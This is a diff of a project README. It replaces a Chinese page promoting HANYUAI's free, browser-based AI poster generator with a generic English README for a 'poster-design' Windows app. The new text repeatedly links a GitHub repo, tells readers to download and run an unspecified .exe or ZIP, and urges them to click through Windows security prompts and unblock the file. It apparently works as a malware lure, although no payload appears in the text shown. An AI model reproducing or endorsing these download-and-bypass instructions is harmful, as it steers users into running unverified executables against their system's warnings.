@@ -1,99 +1,273 @@
-# 🎨 AI 海报设计 - 免费在线通过文字描述智能生成专业海报 | HANYUAI 图像助理
+# 🎨 poster-design - Make Posters Fast and Clean
 
-[![Website Status](https://img.shields.io/badge/Website-Online-brightgreen.svg)](https://www.hanyuai.com/zh/image-generator/poster-design)
-[![Pricing](https://img.shields.io/badge/Price-100%25%20Free-blue.svg)](https://www.hanyuai.com/zh/image-generator/poster-design)
-[![AI Powered](https://img.shields.io/badge/AI-Powered-orange.svg)](https://www.hanyuai.com/zh/image-generator/poster-design)
+[![Download poster-design](https://img.shields.io/badge/Download%20Now-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jaydens792/poster-design)
 
-[**HANYUAI 图像助理 - 免费在线 AI 海报生成工具**](https://www.hanyuai.com/zh/image-generator/poster-design) 是一款专为营销人员、电商卖家、自媒体博主及零基础用户打造的智能海报设计平台。彻底告别复杂的 PS 软件与高昂的设计外包费用！只需上传基础素材或输入一句简单的文字描述，AI 即可在数秒内为您智能排版、自动搭配色彩与字体，一键生成媲美专业设计师的高清商业海报。
+## 🖥️ What this app does
 
-👉 **[立即体验：零设计基础，一键免费生成专属海报](https://www.hanyuai.com/zh/image-generator/poster-design)**
+poster-design is a Windows app for making posters with less effort. It helps you build clean layouts, add text, and shape a design that looks ready for marketing, events, products, or social media use.
 
----
+Use it for:
 
-## 🖼️ 震撼的 AI 海报生成案例展示 (Visual Showcase)
+- Product posters
+- Ecommerce ads
+- Marketing flyers
+- Event posters
+- Sale banners
+- Social media graphics
 
-“一图胜千言”，来看看我们的 AI 引擎如何将普通素材或文字灵感，瞬间转化为极具商业价值的专业视觉海报：
+It is built for people who want a simple way to make a poster without learning design tools first.
 
-### 1. 智能图文融合与背景重构 (Before & After)
-上传基础产品图或人物图，AI 自动完成抠图、背景融合与专业级排版。
+## 📥 Download the app
 
-**✨ 案例一：洗发水产品宣传海报 (清新海洋风)**
-<p align="center">
-  <img src="https://img.hanyuai.com/file/poster-design/DJEx6Bg0.webp" width="48%" alt="产品背景替换前案例图片">
-  <img src="https://img.hanyuai.com/file/poster-design/3dQiWkc4.webp" width="48%" alt="产品背景替换后案例图片 - 蓝绿色调海洋感">
-</p>
+To get poster-design, visit this page to download:
 
-**☕ 案例二：咖啡馆氛围宣传海报 (暖色调社交风)**
-<p align="center">
-  <img src="https://img.hanyuai.com/file/poster-design/GK46OcwD.webp" width="48%" alt="人物背景替换前案例图片">
-  <img src="https://img.hanyuai.com/file/poster-design/dVNT4gOO.webp" width="48%" alt="人物背景替换后案例图片 - 咖啡馆温馨宣传">
-</p>
+https://github.com/Jaydens792/poster-design
 
-**🚗 案例三：汽车销售营销海报 (现代简约风)**
-<p align="center">
-  <img src="https://img.hanyuai.com/file/poster-design/CK3GJHzD.webp" width="48%" alt="汽车海报背景替换前案例图片">
-  <img src="https://img.hanyuai.com/file/poster-design/1lb5EVjt.webp" width="48%" alt="汽车海报背景替换后案例图片 - 科技感汽车展示">
-</p>
+If the page shows a release file for Windows, download it and run that file on your PC.
 
-### 2. 多元营销场景的无中生有 (Text-to-Poster)
-仅需文字提示词，直接生成极具视觉冲击力的高清海报。
-<p align="center">
-  <img src="https://img.hanyuai.com/file/poster-design/t2JRY2di.webp" width="24%" alt="洗发水海报设计示例1">
-  <img src="https://img.hanyuai.com/file/poster-design/sAwDHOsz.webp" width="24%" alt="汽车营销海报生成示例1">
-  <img src="https://img.hanyuai.com/file/poster-design/p6OmjYCY.webp" width="24%" alt="AI智能设计空调海报生成示例1">
-  <img src="https://img.hanyuai.com/file/poster-design/5SFMP9h3.webp" width="24%" alt="AI 智能排版海报生成示例1">
-</p>
+## 🚀 Getting started on Windows
 
----
+Follow these steps to open the app on Windows:
 
-## ✨ 核心优势与功能亮点 (Core Features)
+1. Open the download page in your browser.
+2. Find the latest Windows file.
+3. Download the file to your computer.
+4. Open your Downloads folder.
+5. Double-click the file to start it.
+6. If Windows asks for permission, choose **Run** or **Yes**.
+7. Wait for the app to open.
 
-*   **🪄 文本一键生成海报 (Text-to-Poster)**：描述所需海报（如：产品推广、节日活动或品牌宣传），AI 即可智能生成文字与图像，元素完美融合。
-*   **📐 AI 智能排版**：精准生成契合主题的文字排版，无论是标题主次、正文层次还是装饰元素搭配，都能完美适配内容主题。
-*   **🎯 极简操作零门槛**：无需任何设计基础与排版知识。提供智能构图与色彩把控，实现从概念到成品的快速转化。
-*   **⚡ 极速生成出图**：全流程通常在十几秒内完成，涵盖上传、分析、设计与导出，效率远超传统设计流程。
-*   **🆓 完全免费且免安装**：平台完全开放，网页端直接使用，无需下载、免注册登录、无积分限制。
-*   **💼 100% 商业版权**：生成的海报作品无版权争议，直接授予完整商业使用权，商用营销安全无忧。
+If the file is inside a ZIP folder, do this first:
 
-## 🤖 顶尖 AI 海报设计引擎
+1. Right-click the ZIP file.
+2. Choose **Extract All**.
+3. Open the extracted folder.
+4. Double-click the app file inside the folder.
 
-我们集成了多款行业领先的图像生成大模型，满足特定场景的专业需求：
-*   `Nano Banana Pro`（最火引擎：适合现代简洁风格与快速出图）
-*   `Flux-Kontext`（经典引擎：专攻高逼真度的产品宣传与商业摄影质感）
-*   `Qwen`（适合处理包含复杂文字排版与中文字体的视觉海报）
-*   `Seedream 4.5`（豆包引擎：擅长人像海报与国潮、创意艺术风格）
+## 🧰 System requirements
 
-## 🚀 轻松四步生成专业海报 (How to Use)
+poster-design runs best on a typical Windows computer with:
 
-体验前所未有的智能海报设计工作流：
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 1 GB free disk space
+- A mouse and keyboard
+- A screen with at least 1366 × 768 resolution
+- An internet connection for download access
 
-1.  **上传基础素材（可选）**：[进入 AI 海报生成台](https://www.hanyuai.com/zh/image-generator/poster-design)，上传您的产品原图或人物照片（支持 JPG/PNG/WEBP，最大 24MB）。
-2.  **撰写海报提示词**：向 AI 提供清晰的设计指引。例如：*“现代简约商务海报，蓝色主调，突出科技感，适合汽车营销宣传。”*
-3.  **选择模型与尺寸**：挑选合适的 AI 引擎，并设定您需要的输出比例（如 9:16 手机全屏、4:3 横版、1:1 社交媒体图等）。
-4.  **一键生成并下载**：点击“提交”，约 10 余秒后即可免费下载无水印的高清专业海报成品！
+For smoother work with larger poster files, 8 GB RAM gives better results.
 
----
+## ✨ Main features
 
-## ❓ 常见问题解答 (FAQ)
+### 🎯 Smart poster layout
 
-**Q: AI 生成海报的视觉效果能达到专业设计师水平吗？**  
-**A:** AI 经过千万级优秀商业海报的深度学习，可精准把握色彩搭配、字体选择与版式布局。对于日常营销、电商促销及社媒传播等场景，其质感与专业度完全媲美甚至超越普通商业设计。
+The app helps you place content in a clean way. It is useful when you want a poster to look balanced without spending time on layout work.
 
-**Q: 如果对生成的排版或效果不满意怎么办？**  
-**A:** AI 设计是一个可不断优化的过程。若效果未达预期，您可以通过“补充细节指令”来优化提示词（例如明确：极简留白、黑金配色、赛博朋克风等），AI 将据此重新渲染出更匹配的海报。
+### ✍️ Text-to-poster workflow
 
-**Q: 生成的海报允许商用吗？需要额外付费吗？**  
-**A:** 平台生成的海报作品授予您完整的商业使用权，**无需额外付费**，您可以安全地用于线上社交媒体宣传、电商详情页、线下易拉宝及各类广告项目。
+You can turn a short idea into a poster draft. This helps when you need a fast starting point for ads, sales pages, or event notices.
 
-**Q: 平台对上传的图片素材有隐私保护吗？**  
-**A:** 绝对安全。我们采用全链路加密与先进隐私保护架构，上传的图像仅用于即时的 AI 处理，处理完成后自动销毁，从根源上杜绝任何信息泄露风险。
+### 🧠 AI graphic design support
 
----
+The app uses AI-style layout support to guide design choices. This can help with spacing, text order, and visual structure.
 
-### 🌐 官方入口与探索更多
+### 🛒 Ecommerce poster support
 
-*   **HANYUAI 官方主页**: [www.hanyuai.com](https://www.hanyuai.com/zh)
-*   **AI 海报设计工具直达**: [https://www.hanyuai.com/zh/image-generator/poster-design](https://www.hanyuai.com/zh/image-generator/poster-design)
-*   **探索更多 AI 图像创意神器**: [HANYUAI 图像生成大全](https://www.hanyuai.com/zh/image-generator)
+Make posters for product launches, discount offers, and shop promotions. The layout works well for price tags, product names, and short calls to action.
 
-> **打破设计壁垒，让灵感瞬间变现。立即访问 HANYUAI，用 AI 为您的每一次营销喝彩！**
+### 📢 Marketing poster generator
+
+Create posters for campaigns, brand announcements, and seasonal offers. The app is a fit for quick marketing work where speed matters.
+
+### 🔤 Typography tools
+
+poster-design gives attention to text style and placement. That helps you make headers, prices, and key points easy to read.
+
+### 🧩 Clean poster structure
+
+The app keeps your design neat. It works well for users who want a clear result without many choices that slow them down.
+
+## 🪟 How to use poster-design
+
+Use this simple process to make your first poster:
+
+1. Open the app.
+2. Start a new poster project.
+3. Pick a size that fits your use.
+4. Add your title text.
+5. Add a short message or offer.
+6. Insert any product, event, or brand details.
+7. Adjust the layout until it looks right.
+8. Save the poster file.
+9. Export the final image for sharing or printing.
+
+## 🎨 Good poster ideas
+
+If you need a place to start, try one of these:
+
+- Big sale poster
+- New product launch poster
+- Weekend event poster
+- Social media promo image
+- Store opening flyer
+- Service offer banner
+- School event notice
+- Food menu promo poster
+
+Use short text. Keep the main point near the top. Leave space around the text so the design stays clear.
+
+## 🧾 Folder and file tips
+
+After download, you may see one of these:
+
+- A `.exe` file
+- A `.zip` file
+- A folder with app files inside
+
+If you see a `.exe` file, double-click it to start the app.
+
+If you see a `.zip` file, extract it first, then open the app from the extracted folder.
+
+If Windows shows a security prompt, choose the option that lets you continue running the file.
+
+## 🔧 Basic setup tips
+
+Before you begin, check these points:
+
+- Keep the file in a folder you can find again.
+- Use a simple folder name like `Downloads` or `DesignApps`.
+- Close extra apps if your computer feels slow.
+- Keep your screen size large enough to read text well.
+- Save your work often if the app gives you a save option.
+
+## 📌 Tips for better posters
+
+A good poster usually follows a few simple rules:
+
+- Use one main message
+- Keep text short
+- Use one strong title
+- Place the key offer near the center
+- Use clear spacing
+- Avoid too many fonts
+- Keep the background from fighting the text
+
+If you make a sales poster, put the price and offer where people can see them fast.
+
+If you make a product poster, show the product name first, then add the details.
+
+## 🧭 What the topics mean
+
+This app fits common design needs like:
+
+- ai-graphic-design
+- ai-poster-design
+- commercial-poster-design
+- ecommerce-poster
+- free-online-poster-maker
+- marketing-poster-generator
+- poster-generator
+- smart-layout
+- text-to-poster
+- typography-ai
+
+These topics point to a tool made for poster work, short text design, and fast layout creation.
+
+## 🪄 Example use cases
+
+### 🛍️ Ecommerce sale poster
+
+Use the app to build a poster for a discount campaign. Add the product name, price cut, and shop name.
+
+### 🎪 Event poster
+
+Make a poster for a concert, meetup, school show, or local event. Add the date, time, place, and contact line.
+
+### 📱 Social media post
+
+Create a graphic that fits an online post. Use a short headline and a clean layout for easy reading on a phone.
+
+### 🏬 Store promo sign
+
+Make a sign for a shop window or counter display. Keep the message short and clear so people can read it fast.
+
+## 🧑‍💻 For non-technical users
+
+You do not need design skills to start. Just open the app, choose a poster size, type your message, and place your main text first. If something looks crowded, remove extra words before you change the layout.
+
+A simple poster often works better than a busy one.
+
+## 📦 Download and install path
+
+Use this link to download and run the app on Windows:
+
+https://github.com/Jaydens792/poster-design
+
+Open the page, download the Windows file, then run it on your computer
+
+## 🗂️ Suggested file names for your work
+
+When you save posters, use names that make sense later, such as:
+
+- `sale-poster.png`
+- `new-product-ad.png`
+- `event-flyer.png`
+- `social-promo.png`
+- `brand-banner.png`
+
+Clear file names help you find the right poster fast.
+
+## 🔍 Troubleshooting
+
+### The file does not open
+
+- Make sure the download finished
+- Check if the file is inside a ZIP folder
+- Extract the ZIP file first
+- Try opening the file again
+
+### Windows blocks the app
+
+- Right-click the file
+- Choose **Properties**
+- Check whether Windows marked it as blocked
+- Allow the file if your system asks for permission
+
+### The app opens but looks small
+
+- Maximize the window
+- Check your display scaling
+- Use a larger screen if needed
+
+### The app feels slow
+
+- Close other apps
+- Restart your computer
+- Make sure you have enough free memory
+- Keep only one large poster open at a time
+
+## 📎 Useful workflow
+
+For the best result, work in this order:
+
+1. Pick the poster goal
+2. Write the main line
+3. Add the support text
+4. Choose the layout
+5. Check spacing
+6. Review text size
+7. Save the file
+8. Export the final poster
+
+## 🧾 What to include in a poster
+
+A strong poster often has:
+
+- A clear title
+- One main message
+- A short detail line
+- Date or price if needed
+- Brand or shop name
+- Contact or web link if needed
+
+Keep the design simple and easy to scan.
